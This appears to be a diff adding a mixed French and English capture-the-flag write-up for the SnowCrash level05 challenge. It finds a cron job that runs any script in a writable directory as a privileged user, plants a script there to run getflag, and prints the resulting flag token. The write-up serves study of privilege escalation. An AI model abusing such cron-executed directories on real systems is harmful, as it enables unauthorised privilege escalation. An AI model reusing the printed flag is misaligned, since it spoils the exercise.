@@ -1,0 +1,54 @@
+Filtrer les resultats pour trouver des liens avec "level05" ou "flag05" 
+
+find / 2>/dev/null | grep "level05"
+
+/var/mail/level05
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+*/2 * * * * : C'est la syntaxe du calendrier de cron, spécifiant la fréquence à laquelle la tâche doit être exécutée. Dans ce cas, il s'agit de toutes les deux minutes. Plus précisément, cela signifie "toutes les minutes divisibles par deux", donc la tâche s'exécute à 0, 2, 4, 6, ..., 58 minutes de chaque heure.
+
+su -c "sh /usr/sbin/openarenaserver" - flag05 : C'est la commande qui sera exécutée à chaque fois que la tâche cron est déclenchée. Elle utilise la commande su pour exécuter la commande suivante en tant qu'un autre utilisateur, en l'occurrence, l'utilisateur flag05. Le paramètre -c permet de spécifier la commande à exécuter. Dans ce cas, la commande est sh /usr/sbin/openarenaserver, qui exécute le script openarenaserver en tant qu'utilisateur flag05.
+
+En résumé, cette ligne dans le fichier de crontab indique que toutes les deux minutes, le script /usr/sbin/openarenaserver sera exécuté en tant qu'utilisateur flag05.
+
+level05@SnowCrash:/var/mail$ ls -la /usr/sbin/openarenaserver
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+
+On voit qu'on a aucun droit... so lets investigate
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+La boucle for parcourt tous les fichiers dans le répertoire /opt/openarenaserver/.
+
+Pour chaque fichier $i trouvé dans ce répertoire :
+
+Il fixe la limite de temps d'exécution à 5 secondes avec ulimit -t 5.
+Il exécute le fichier avec le shell Bash en mode verbose (-x) : bash -x "$i".
+Il supprime le fichier avec la commande rm -f "$i".
+
+This script will run all files in /opt/openarenaserver in a bash shell. Thus we should create a bash script to call getflag in /opt/openarenaserver/.
+
+
+so, 
+cd /opt/openarenaserver
+cat > getflag.sh
+#!/bin/bash
+
+getflag
+ctrl+d
+
+
+level05@SnowCrash:~$ echo "getflag > /dev/shm/flag" > /opt/openarenaserver/getflag.sh
+level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh
+
+cat /dev/shm/flag => cat l'execution d'un fichier qu'on a partage
+
+viuaaale9huek52boumoomioc
+
